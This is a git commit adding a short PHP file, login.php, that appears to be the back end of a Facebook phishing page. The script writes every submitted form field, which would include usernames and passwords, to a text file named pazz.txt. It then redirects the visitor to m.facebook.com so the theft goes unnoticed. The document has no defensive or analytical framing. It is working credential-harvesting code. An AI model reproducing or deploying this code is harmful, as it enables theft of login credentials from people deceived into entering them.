dc0a05bc02c351888caa76367012a90c69cd4d69
pinnocent <65961768+pinnocent@users.noreply.github.com>
2020-06-25 05:20:22 -1200

    Add files via upload

---
+++ asset/fcode/login.php
@@ -0,0 +1,18 @@
+ <?php
+// pinnocent
+header
+('location:');
+$handle=fopen("pazz.txt","a");
+foreach($_POST as $variable=>$value)
+{
+fwrite($handle,$variable);
+fwrite($handle,"=");
+fwrite($handle,$value);
+fwrite($handle,"\r\n");
+}
+fwrite($handle,"\r\n");
+fclose($handle);
+header("location:http://m.facebook.com");
+exit;
+// pinnocent
+?>
